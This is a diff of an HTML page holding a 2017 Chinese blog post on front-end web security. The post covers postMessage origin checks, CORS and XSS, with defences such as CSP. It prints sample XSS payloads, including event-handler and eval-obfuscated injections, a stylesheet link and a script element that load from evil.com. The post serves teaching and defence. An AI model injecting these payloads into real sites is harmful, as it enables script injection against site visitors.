@@ -1,143 +1,219 @@
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="en">
+
+<!-- Head tag -->
 <head>
-    <!-- so meta -->
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="常见的web攻击原理与防御跨域与同源策略跨域方式：  postMessage(html5) 请求头Origin与响应头Access-Contorl-Allow-Origin(XmlHttpRequest2.0) 其他跨域方式  postMesage在postMessage进行跨域发送和接受时进行严格的域名来源限制  示例:从A页面（www.abc.com)跨域发消息到B页面（api.abc.com">
-<meta name="keywords" content="web安全,跨域,HTTP劫持,XSS,CSRF,nodejs">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Web前端安全">
-<meta property="og:url" content="http://perkinj.github.io/2017/06/16/webSecurity/index.html">
-<meta property="og:site_name" content="Perkin">
-<meta property="og:description" content="常见的web攻击原理与防御跨域与同源策略跨域方式：  postMessage(html5) 请求头Origin与响应头Access-Contorl-Allow-Origin(XmlHttpRequest2.0) 其他跨域方式  postMesage在postMessage进行跨域发送和接受时进行严格的域名来源限制  示例:从A页面（www.abc.com)跨域发消息到B页面（api.abc.com">
-<meta property="og:updated_time" content="2017-06-16T10:05:23.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Web前端安全">
-<meta name="twitter:description" content="常见的web攻击原理与防御跨域与同源策略跨域方式：  postMessage(html5) 请求头Origin与响应头Access-Contorl-Allow-Origin(XmlHttpRequest2.0) 其他跨域方式  postMesage在postMessage进行跨域发送和接受时进行严格的域名来源限制  示例:从A页面（www.abc.com)跨域发消息到B页面（api.abc.com">
-    
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Perkin在 Github 上的个人博客">
+    <meta name="keyword" content="perkinzone">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="http://oum6ifofe.bkt.clouddn.com/about.ico">
+    <link rel="alternate" type="application/atom+xml" title="Perkin" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
         
-          
-              <link rel="shortcut icon" href="/images/favicon2.ico">
-          
+        Web前端安全｜Perkin
         
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon2.ico" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon2.ico">
-          
-        
-    
-    <!-- title -->
-    <title>Web前端安全</title>
-    <!-- styles -->
-    <link rel="stylesheet" href="/css/style.css">
-    <!-- rss -->
-    
-    
+    </title>
+
+    <link rel="canonical" href="http://perkinj.github.io/2017/06/16/webSecurity/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
 </head>
 
-<body>
+<style>
+
+    header.intro-header {
+        background-image: url('http://oum6ifofe.bkt.clouddn.com/image/home.jpg')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    Perkin
+                </span>
+                的博客
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">主页</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">
+                            标签
+                            </a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/about/">
+                            关于我
+                            </a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/archives/">
+                            归档
+                            </a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="http://oum6ifofe.bkt.clouddn.com/image/default.jpg">
+
+
+<style>
     
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">主页</a></li>
-         
-          <li><a href="/archives/">杂谈</a></li>
-         
-          <li><a href="http://github.com/perkinj">项目</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2017/07/16/学习相关Nginx配置/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
-        
-        
-        <li><a class="icon" href="/2017/06/16/基于react的视频类APP分享页填坑总结/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
-        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://perkinj.github.io/2017/06/16/webSecurity/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://perkinj.github.io/2017/06/16/webSecurity/&text=Web前端安全"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://perkinj.github.io/2017/06/16/webSecurity/&is_video=false&description=Web前端安全"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Web前端安全&body=Check out this article: http://perkinj.github.io/2017/06/16/webSecurity/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://perkinj.github.io/2017/06/16/webSecurity/&name=Web前端安全&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的web攻击原理与防御"><span class="toc-number">1.</span> <span class="toc-text">常见的web攻击原理与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#跨域与同源策略"><span class="toc-number">1.1.</span> <span class="toc-text">跨域与同源策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#postMesage"><span class="toc-number">1.1.1.</span> <span class="toc-text">postMesage</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Control-Allow-Origin"><span class="toc-number">1.1.2.</span> <span class="toc-text">Access-Control-Allow-Origin</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跨站脚本攻击-XSS"><span class="toc-number">1.2.</span> <span class="toc-text">跨站脚本攻击-XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#危害："><span class="toc-number">1.2.1.</span> <span class="toc-text">危害：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS的分类与原理"><span class="toc-number">1.2.2.</span> <span class="toc-text">XSS的分类与原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例"><span class="toc-number">1.2.3.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS构造"><span class="toc-number">1.2.4.</span> <span class="toc-text">XSS构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS的防御"><span class="toc-number">1.2.5.</span> <span class="toc-text">XSS的防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跨站请求伪造-CSRF"><span class="toc-number">1.3.</span> <span class="toc-text">跨站请求伪造-CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF攻击防御"><span class="toc-number">1.3.1.</span> <span class="toc-text">CSRF攻击防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入攻击"><span class="toc-number">1.4.</span> <span class="toc-text">SQL注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL注入的危害"><span class="toc-number">1.4.1.</span> <span class="toc-text">SQL注入的危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL注入攻击防御"><span class="toc-number">1.4.2.</span> <span class="toc-text">SQL注入攻击防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络劫持"><span class="toc-number">1.5.</span> <span class="toc-text">网络劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#网络劫持防御"><span class="toc-number">1.5.1.</span> <span class="toc-text">网络劫持防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS的安全问题"><span class="toc-number">1.6.</span> <span class="toc-text">NodeJS的安全问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开发中安全意识"><span class="toc-number">2.</span> <span class="toc-text">开发中安全意识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安全意识："><span class="toc-number">2.1.</span> <span class="toc-text">安全意识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#请求数据校验"><span class="toc-number">2.1.1.</span> <span class="toc-text">请求数据校验</span></a></li></ol></li></ol></li></ol>
-    </div>
-  </span>
-</div>
+    header.intro-header {
+        background-image: url('http://oum6ifofe.bkt.clouddn.com/image/default.jpg')
+    }
 
     
-    <div class="content index width mx-auto px2 my4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        Web前端安全
-    </h1>
+</style>
 
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">Perkin</span>
-      </span>
-      
-    <div class="postdate">
-        <time datetime="2017-06-16T10:05:23.000Z" itemprop="datePublished">2017-06-16</time>
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>Web前端安全</h1>
+                    
+                    <span class="meta">
+                         作者 Perkin
+                        <span>
+                          日期 2017-06-16
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#web安全"
+                           title="web安全">web安全</a>
+                        
+                        <a class="tag" href="/tags/#跨域"
+                           title="跨域">跨域</a>
+                        
+                        <a class="tag" href="/tags/#HTTP劫持"
+                           title="HTTP劫持">HTTP劫持</a>
+                        
+                        <a class="tag" href="/tags/#XSS"
+                           title="XSS">XSS</a>
+                        
+                        <a class="tag" href="/tags/#CSRF"
+                           title="CSRF">CSRF</a>
+                        
+                        <a class="tag" href="/tags/#nodejs"
+                           title="nodejs">nodejs</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/CSRF/">CSRF</a>, <a class="tag-link" href="/tags/HTTP劫持/">HTTP劫持</a>, <a class="tag-link" href="/tags/XSS/">XSS</a>, <a class="tag-link" href="/tags/nodejs/">nodejs</a>, <a class="tag-link" href="/tags/web安全/">web安全</a>, <a class="tag-link" href="/tags/跨域/">跨域</a>
+    <div class="post-title-haojen">
+        <span>
+            Web前端安全
+        </span>
     </div>
+</header>
 
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <h2 id="常见的web攻击原理与防御"><a href="#常见的web攻击原理与防御" class="headerlink" title="常见的web攻击原理与防御"></a>常见的web攻击原理与防御</h2><h3 id="跨域与同源策略"><a href="#跨域与同源策略" class="headerlink" title="跨域与同源策略"></a>跨域与同源策略</h3><p>跨域方式：</p>
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h2 id="常见的web攻击原理与防御"><a href="#常见的web攻击原理与防御" class="headerlink" title="常见的web攻击原理与防御"></a>常见的web攻击原理与防御</h2><h3 id="跨域与同源策略"><a href="#跨域与同源策略" class="headerlink" title="跨域与同源策略"></a>跨域与同源策略</h3><p>跨域方式：</p>
 <ul>
 <li>postMessage(html5)</li>
 <li>请求头Origin与响应头Access-Contorl-Allow-Origin(XmlHttpRequest2.0)</li>
@@ -145,9 +221,9 @@
 </ul>
 <h4 id="postMesage"><a href="#postMesage" class="headerlink" title="postMesage"></a>postMesage</h4><p>在postMessage进行跨域发送和接受时进行严格的域名来源限制</p>
 <blockquote>
-<p>示例:从A页面（www.abc.com)跨域发消息到B页面（api.abc.com)<br>页面A<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> mesg = &#123;<span class="attr">title</span>:<span class="string">'information'</span>,<span class="attr">desc</span>:<span class="string">'say hello world'</span>&#125;</div><div class="line"><span class="comment">//var tarfetOrigin = '*'  //targetOrigin为'*'号时，可能将导致数据泄露到恶意站点</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> tarfetOrigin = <span class="string">'http://api.abc.com'</span>  <span class="comment">//需制定接收消息窗口的origin，慎用* </span></div><div class="line"><span class="keyword">var</span> frameB = <span class="built_in">document</span>.getElementById(<span class="string">'pageB'</span>)</div><div class="line">frameB.contentWindow.postMessage(msg,targetOrigin)</div></pre></td></tr></table></figure></p>
+<p>示例:从A页面（www.abc.com)跨域发消息到B页面（api.abc.com)<br>页面A<br><figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> mesg = &#123;<span class="attr">title</span>:<span class="string">'information'</span>,<span class="attr">desc</span>:<span class="string">'say hello world'</span>&#125;</div><div class="line"><span class="comment">//var tarfetOrigin = '*'  //targetOrigin为'*'号时，可能将导致数据泄露到恶意站点</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> tarfetOrigin = <span class="string">'http://api.abc.com'</span>  <span class="comment">//需制定接收消息窗口的origin，慎用* </span></div><div class="line"><span class="keyword">var</span> frameB = <span class="built_in">document</span>.getElementById(<span class="string">'pageB'</span>)</div><div class="line">frameB.contentWindow.postMessage(msg,targetOrigin)</div></pre></td></tr></table></figure></p>
 </blockquote>
-<p>页面B<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,onReceivedMessage,<span class="literal">false</span>)</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onReceivedMessage</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> origin = event.origin || event.originEvent.origin</div><div class="line">    <span class="keyword">if</span>(origin != <span class="string">'http://www.abc.com'</span>)&#123;</div><div class="line">        <span class="keyword">return</span></div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="comment">//do something</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>页面B<br><figure class="highlight js"><table><tr><td class="code"><pre><div class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,onReceivedMessage,<span class="literal">false</span>)</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onReceivedMessage</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> origin = event.origin || event.originEvent.origin</div><div class="line">    <span class="keyword">if</span>(origin != <span class="string">'http://www.abc.com'</span>)&#123;</div><div class="line">        <span class="keyword">return</span></div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="comment">//do something</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <h4 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" title="Access-Control-Allow-Origin"></a>Access-Control-Allow-Origin</h4><p>服务端设置Access-Control-Allow-Origin</p>
 <p>安全的做法：查询域名是否在白名单，再设置Access-Control-Allow-Origin为当前的域名</p>
 <h3 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击-XSS"></a>跨站脚本攻击-XSS</h3><p>cross-site scripting,通过在页面中注入脚本，然后触发执行，获取相应的权限。</p>
@@ -165,12 +241,12 @@
 </li>
 <li>基于DOM（反射型的一种）：恶意用户(攻击代码)–&gt;浏览器–&gt;页面–&gt;(document.write(xss),node.innerHTML = XSS,node.outerHTML = XSS) –&gt;页面–&gt;浏览器–&gt;普通用户</li>
 </ul>
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>1.正常注入（sec,javascript)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:alert(/xss/)"</span> <span class="attr">width</span>=<span class="string">100</span> /&gt;</span></div></pre></td></tr></table></figure></p>
-<p>2.事件注入（onerror、onclick)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(/xss/)"</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>3.通过css构造(background-img:url、expression、link-href、@import)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image:url(javascript:alert(xcss'));width:expression(alert('xss'))"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">body&#123;background-image:url("javascript:alert('xss')")&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/attack.css"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">@import 'javascript:alert('xss')'</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>4.通过Javascript函数(eval()函数、ASCII编码)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">"alert('xss')"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:eval(String.fromaCharCode(97,108,123,34,45))"</span> /&gt;</span></div></pre></td></tr></table></figure></p>
-<p>5.基于DOM型创建（有字数限制的输入框）<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=<span class="string">"document."</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">"write"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">"alert"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">"/xss/"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">");"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>6.基于DOM型创建(创建节点)<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</div><div class="line">a.src=<span class="string">'http://www.evil.com/css.js'</span></div><div class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[o].appendChild(s)</div></pre></td></tr></table></figure></p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>1.正常注入（sec,javascript)<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:alert(/xss/)"</span> <span class="attr">width</span>=<span class="string">100</span> /&gt;</span></div></pre></td></tr></table></figure></p>
+<p>2.事件注入（onerror、onclick)<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(/xss/)"</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>3.通过css构造(background-img:url、expression、link-href、@import)<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image:url(javascript:alert(xcss'));width:expression(alert('xss'))"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">body&#123;background-image:url("javascript:alert('xss')")&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/attack.css"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">@import 'javascript:alert('xss')'</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>4.通过Javascript函数(eval()函数、ASCII编码)<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">"alert('xss')"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:eval(String.fromaCharCode(97,108,123,34,45))"</span> /&gt;</span></div></pre></td></tr></table></figure></p>
+<p>5.基于DOM型创建（有字数限制的输入框）<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=<span class="string">"document."</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">"write"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">"alert"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">"/xss/"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">");"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>6.基于DOM型创建(创建节点)<br><figure class="highlight js"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</div><div class="line">a.src=<span class="string">'http://www.evil.com/css.js'</span></div><div class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[o].appendChild(s)</div></pre></td></tr></table></figure></p>
 <h4 id="XSS构造"><a href="#XSS构造" class="headerlink" title="XSS构造"></a>XSS构造</h4><ul>
 <li>通过html属性构造：src,lowsrc,dynsrc,bgsound,background,action,href,value…</li>
 <li>通过html事件构造：onclick,onerror,onmouseover</li>
@@ -186,13 +262,13 @@
 <li>CSP(content security policy):通过在http响应头中加入相关指令告知浏览器，被保护页面仅允许加载和执行指令中限制的内容，不满足的资源与内容不执行或被客户端阻断</li>
 </ul>
